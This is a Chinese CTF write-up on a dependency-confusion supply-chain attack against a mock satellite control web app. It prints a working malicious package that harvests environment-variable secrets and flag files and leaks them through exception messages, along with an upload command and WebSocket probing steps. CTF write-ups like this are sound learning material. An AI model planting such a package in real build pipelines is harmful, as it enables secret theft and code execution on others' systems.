---
title: 供應鏈污染一顆衛星的地面控制軟體——STARPWN 2026「Starry Hacks」解題筆記
tags:
  - STARPWN
  - CTF
  - Supply Chain
  - Dependency Confusion
  - Web
categories:
  - CTF Writeup
aside: true
toc: true
abbrlink: bdb3b555
date: 2026-09-21 21:10:40
top_img:
cover:
---

> 🌐 English version: [English](/en/posts/bdb3b555.html)


這篇跟之前幾篇無人機/軌道力學系列不一樣，是一題貨真價實的 **Web / Supply Chain** 題目，只是場景換成了地面控制軟體，玩法是經典的 **dependency confusion** [（依賴混淆）供應鏈攻擊](https://www.imperva.com/learn/application-security/dependency-confusion/) ，最後靠著把伺服器的錯誤訊息當成資料外洩通道，才把 flag 從環境變數裡挖出來

<!-- more -->

## 題目在講什麼

{% note info %}
One of your daemons found a low-rent orbital control stack talking to its bird in the clear. That's kind of mistake gets people burned, and you just happen to have a lighter and too much time on your hands tonight.

You've already found an archive of the flight software repo, a live target, and a supply chain that looks just soft enough to ruin somebody's night.
{% endnote %}

> 翻成白話：你手上有一份洩漏出來的飛控軟體 repo，還有一個活著的線上目標，以及一條看起來軟到可以捏爆的供應鏈，兒任務是想辦法搞一個惡意的套件更新，讓它鑽進正常的部署流程裡，最後挖出衛星藏著的秘密


拿到的東西有兩樣：
- 一份 566 bytes 的 `fligh_repo.tar.gz`（洩漏的飛控軟體 repo 片段）
- 跟一個線上的 Mission Control 網頁後台

## 先看洩漏的 repo：一個教科書等級的依賴混淆漏洞

repo 裡只有三個檔案：

```
mission/
  flight_app/
    __init__.py
    main.py
  requirements.txt
```

`requirements.txt` 只有一行：

```
cubesat-upstream-driver>=1.0.0
```

`main.py` 裡的關鍵片段：

```python
from cubesat_upstream_driver import handle_command

def process_command(cmd: str) -> str:
    cmd = (cmd or "").strip()
    driver_reply = handle_command(cmd)
    if driver_reply:
        return f"TM|EVENT|COMMAND_ACK|{driver_reply}"
    ...
```

這是一個很經典的 **dependency confusion**（依賴混淆）設定：飛控軟體 import 了一個聽起來很像是內部專屬套件的第三方套件（`cubesat_upstream_driver`），而 `requirements.txt` 只釘了一個下限版本（`>=1.0.0`），完全沒有指定套件來源索引，也沒有 hash 校驗

這種寫法的風險是：如果攻擊者能讓建置流程從某個攻擊者能控制的來源，解析到一個**同名但版本號更高**的套件，攻擊者的程式碼就會被裝進去、跟著正常流程一起執行，而且更妙的是，`handle_command()` 的回傳值會直接被塞進遙測回應裡送出去，等於內建了一條現成的資料外洩通道

## 看一下線上目標長怎樣

線上的 Mission Control 網頁後台有：一個指令主控台（`PING`、`STATUS`、`ORBIT`、`HELP`、`RESET`、`TRIGGER_BUILD`、`DEPLOY_SOLAR_PANEL` 幾個按鈕,加一個可以打自訂文字的輸入框)、一個檔案上傳元件(接受 `.whl` / `.tar.gz`)、還有一條 WebSocket 即時推遙測資料


但光看畫面沒用，真正有資訊量的是背後跑的協定，與其在網頁上點按鈕，我直接把前端打包好的 JS bundle（`/assets/index-*.js`）抓下來讀，想知道這些按鈕實際上是對後端講什麼。看完確認了幾件事：

**1. 指令是透過 WebSocket 送的，而且完全沒有身份驗證** 自訂指令文字是包成這樣的 JSON，透過 `wss://<host>/ws?sid=<uuid>` 送出去：

```json
{"type": "command", "command": "<你輸入的文字>"}
```

那個 `sid` 只是瀏覽器自己 `crypto.randomUUID()` 產生、存在 `localStorage` 的 UUID，換一個新的照樣能連，這代表這條 WebSocket 沒有任何 session 驗證，任何人都能直接連上去講話

**2. `/openapi.json` 忘了關** 

這是 FastAPI 預設會掛上去的 API schema，直接把整個 REST 介面攤開給你看：

```
POST /api/upload?submit_to_gateway=true   # 上傳 artifact，可轉送到 gateway
GET  /api/artifacts/{artifact_id}
POST /api/session/reset
GET  /api/health
```

上傳元件走的就是 `POST /api/upload`（multipart，欄位名 `file`），而那個 `submit_to_gateway=true` 的參數，正是後面依賴混淆能成立的關鍵

**3. 指令框有白名單擋著** 

試著在指令框直接打任意文字，想看看有沒有 command injection，結果一律回：

```
400: command not allowed
```

比對 `HELP` 指令回傳的內容，伺服器端的白名單就是畫面上那幾顆按鈕：`PING,STATUS,ORBIT,HELP,RESET,DEPLOY_SOLAR_PANEL,TRIGGER_BUILD`

所以從指令框想要command injection這條路是死的，真正該走的是第一步在洩漏 repo 裡看到的那個依賴混淆角度

## 動手做一個惡意套件

整條攻擊鏈長這樣:

```
cubesat-upstream-driver（requirements.txt 預期的版本 >=1.0.0）
        ↓ 攻擊者上傳一個同名、版本號更高的套件
POST /api/upload → 轉送到內部的「gateway」（私有套件索引）
        ↓
下 TRIGGER_BUILD 指令 → 飛控軟體重新從那個索引安裝依賴
        ↓
下一次呼叫 handle_command() 就會執行攻擊者的程式碼
```

刻一個純 Python 的 wheel 檔,套件名一樣叫 `cubesat-upstream-driver`,版本號拉到遠高於 `1.0.0`(`9.9.x`),裡面塞一個惡意的 `__init__.py`,上傳上去:

```bash
curl -s -X POST https://.../api/upload -F "file=@cubesat_upstream_driver-9.9.x-py3-none-any.whl"
```

回應裡有兩個獨立的欄位:

```json
{
  "score": {"ok": true/false, "reason": "marker matched / marker not matched"},
  "gateway_upload": {"ok": true, "status_code": 200, "body": "{\"status\":\"ok\",\"stored\":\"...\"}"}
}
```

`score` 這個欄位其實是個**誘餌** ，一開始當然會以為 `score.ok == true` 就代表攻擊成功，但它的 `reason` 欄位寫的是 `marker matched / marker not matched` ，marker 這個字眼很可疑，聽起來不像在檢查套件能不能執行，比較像在比對某個字串

於是我就實驗看看：

上傳兩個 gateway 那端行為完全一樣的套件，唯一差別是 `__init__.py` 的原始碼裡有沒有塞入 `if cmd == "DEPLOY_SOLAR_PANEL":` 這一行字面文字，結果 `score.ok` 就跟著這行字的有無在 `true` / `false` 之間翻，但 `gateway_upload.ok` 始終不變

這就證明了 `score` 只是對上傳的**原始碼做靜態字串比對**，跟套件到底有沒有被安裝、有沒有真的被 import 執行完全無關——它只是拿來引誘你去追 `DEPLOY_SOLAR_PANEL` 那條死路的餌

真正重要的是 `gateway_upload.ok`，它才是確認你的惡意套件真的被收進建置流程會用到的那個索引（gateway）。這個欄位就低調地擺在顯眼的 `score` 旁邊，很容易被忽略掉

## 中間踩了幾個死路

**死路一:`DEPLOY_SOLAR_PANEL` 一直失敗** 

在過程中按 `TRIGGER_BUILD` 都會回 `BUILD|HTTP_200|{"status":"ok"}`, 但接著送 `DEPLOY_SOLAR_PANEL` 永遠回 `TM|ERR|FLIGHT_UNREACHABLE`,不管介面上顯示的模擬連線狀態是什麼。

後來想通了：`DEPLOY_SOLAR_PANEL` 這個指令本身就是**設計來騙人的**——它被綁在一條「需要真實硬體才會通」的程式碼路徑上，而題目環境裡根本沒有那個硬體，所以不管你套件植入得多成功，送這個指令永遠只會回 `FLIGHT_UNREACHABLE`，它從一開始就不是拿來拿 flag 的正路。前面那個看到 `if cmd == "DEPLOY_SOLAR_PANEL":` 就給你打勾的 `score` 標記，就是同一個陷阱的另一半：一個引你把注意力全押在這個指令上、一個讓你誤以為押對了。真正會呼叫到植入套件、又真的能通的指令，其實是不起眼的 `STATUS`（下一個死路就會發現這件事）。

**死路二:`PING`/`STATUS` 看起來完全沒受影響** 

重複做「上傳 → build → 打 PING」的循環,回應永遠是標準的 `TM|HEALTH|OK`,一度以為套件根本沒被吃進去。

這裡直接用 Python 的 `websockets` 函式庫繞過前端網頁去打原始的 WebSocket 才發現真相: **`PING` 跟 `ORBIT` 這兩個指令根本不會呼叫 `handle_command()`**,是伺服器在本地直接回答的,跟洩漏的 `main.py` 暗示的不一樣，只有 `STATUS` 跟 `DEPLOY_SOLAR_PANEL` 真的會呼叫到我們植入的套件

**關鍵發現:例外訊息本身就是外洩通道** 

對 WebSocket 傳送格式怪異的訊息(比如把 `command` 欄位塞數字或陣列)會讓伺服器把原始的 Python 例外訊息洩漏回來,例如 `"'list' object has no attribute 'strip'"`。

把同樣的想法用在自己植入的套件上，讓 `handle_command()` **主動丟出例外**而不是正常回傳，確認了伺服器會把例外內容原封不動包在回應裡送回來:

```
TM|ERR|EXCEPTION|<例外訊息內容>|SAT_LINK=1|SAT_LAT=...|SAT_LON=...
```

這就是真正能拿來外洩資料的管道， **不管在例外訊息裡塞什麼字串,都會被原樣送回瀏覽器**

**死路三:第一版偵察 payload 靜悄悄地失敗了** 

第一次嘗試 `raise RuntimeError("RECON<<<" + scan() + ">>>")`,其中 `scan()` 做了掃描環境變數、讀幾個檔案,還跑了一個遞迴搜尋整個檔案系統的 `subprocess.run(["sh","-c","grep -rl 'STARPWN{' / ..."])`

結果只回了一句乾巴巴的 `FLIGHT_UNREACHABLE`,什麼訊息都沒有

這裡沒辦法直接看到伺服器內部的 log，但可以用**行為對比**反推出原因。關鍵的證據是： **同一套外洩機制，只差在 payload 跑多快，結果就完全不同**

- 前一步才剛確認過，只要讓 `handle_command()` 丟出例外，伺服器就會把例外訊息原樣回傳（`TM|ERR|EXCEPTION|...`）。這條管道本身是通的
- 但這一版塞了遞迴 `grep /` 的 payload，回來的卻是**乾巴巴的 `FLIGHT_UNREACHABLE`**、連一個字的例外訊息都沒有，感覺像伺服器在等一個一直不回來的東西
- 把 payload 換成一個幾乎瞬間完成的版本（只掃 `os.environ` + 讀幾個固定路徑，拿掉 subprocess、拿掉整個檔案系統的 `grep`），**外洩管道立刻又通了**，例外訊息連同 flag 一起被送回來

換句話說，管道是通的、快的 payload 也是通的，只有 **慢的 payload」** 會回 `FLIGHT_UNREACHABLE` 能同時解釋這三件事的原因只有一個：那個遞迴 `grep` 掃整個檔案系統太慢，撞爆了伺服器模擬飛控往返的timeout時間

伺服器等到timeout就先一步回報連線不通，我們丟出的例外根本還沒被 catch、格式化，就已經沒機會送出去了

> **排查這種 blind 的注入時，一定要把「我的程式碼到底有沒有在跑」（快、簡單的probe）跟「我的程式碼能碰到什麼」（真正的 payload）分開驗證**，不然一個無關的逾時就會讓一個其實已經成功的注入看起來像徹底失敗

## 最終的 payload

```python
import os

SEP = " ~~~ "

def _scan():
    hits = []
    for k, v in os.environ.items():
        if "FLAG" in k.upper() or "STARPWN{" in str(v):
            hits.append(f"{k}={v}")
    candidates = [
        "/flag", "/flag.txt", "/app/flag.txt", "/app/flag",
        "/root/flag.txt", "/opt/flag.txt", "/mission/flag.txt",
        "/mission/flag", "/mission/flight_app/flag.txt",
    ]
    for p in candidates:
        try:
            if os.path.isfile(p):
                with open(p, "r", errors="replace") as fh:
                    hits.append(f"{p}:{fh.read().strip()}")
        except Exception:
            pass
    if not hits:
        hits = ["ROOT:" + ",".join(os.listdir("/")), "CWD:" + os.getcwd()]
    return SEP.join(hits).replace("|", "_")[:600]

def handle_command(cmd: str):
    raise RuntimeError("RECON " + _scan())
```

打包成 `cubesat-upstream-driver` v9.9.20,上傳、用 `TRIGGER_BUILD` 觸發安裝,再打一次 `STATUS`:

```
TM|ERR|EXCEPTION|RECON FLAG=STARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}|SAT_LINK=1|SAT_LAT=42.1494|SAT_LON=-121.0978
```

flag 就直接躺在飛控程式的 `FLAG` 環境變數裡

## Flag

```
STARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}
```

用 leetspeak 還原回來是 "Through victory my chains ~ break token"

呼應這次靠著讓例外訊息變成外洩通道這條鏈被打破，才把秘密洩漏出來的過程

## 心得

1. **Dependency confusion 是一個真實而且很快就能利用的漏洞。** 只要能把一個同名、版本號更高的套件塞進建置流程信任的來源，攻擊者的程式碼就會被裝進去執行。根本原因就是只釘下限版本（`>=1.0.0`）卻沒有指定套件來源索引或 hash 校驗。
2. **不要只相信畫面上看起來像「成功」的那個欄位。** `score` 看起來像驗證結果，其實只是一個跟套件能不能用完全無關的靜態字串比對，用來誘導你去追一個死路指令（`DEPLOY_SOLAR_PANEL`）。真正重要的 `gateway_upload.ok` 反而容易被旁邊那個顯眼的欄位蓋過去。
3. **直接跟底層協定講話，不要只透過前端介面互動。** React 網頁只會送出固定格式的 `{"type":"command",...}`；直接用 Python 寫個 WebSocket client 去打原始協定，才能亂餵各種格式的訊息、抓到請求跟回應交錯的細節。
4. **錯誤訊息是一條外洩通道。** 一旦確認伺服器會把例外內容原樣回傳給客戶端，用 `raise` 主動丟例外會比正常 `return` 更好用來探測未知的呼叫慣例——不需要事先知道正確的回應格式長怎樣。
5. **植入的 payload 要夠快。** 太慢的偵察程式碼可能會先撞上一個完全無關的逾時／保護機制，讓整個攻擊看起來像是失敗了，掩蓋掉其實已經成功注入的事實。除錯時該把「我的程式碼到底有沒有被執行到」（快、簡單的探測）跟「我的程式碼能碰到什麼東西」（真正的 payload）分開驗證。

----
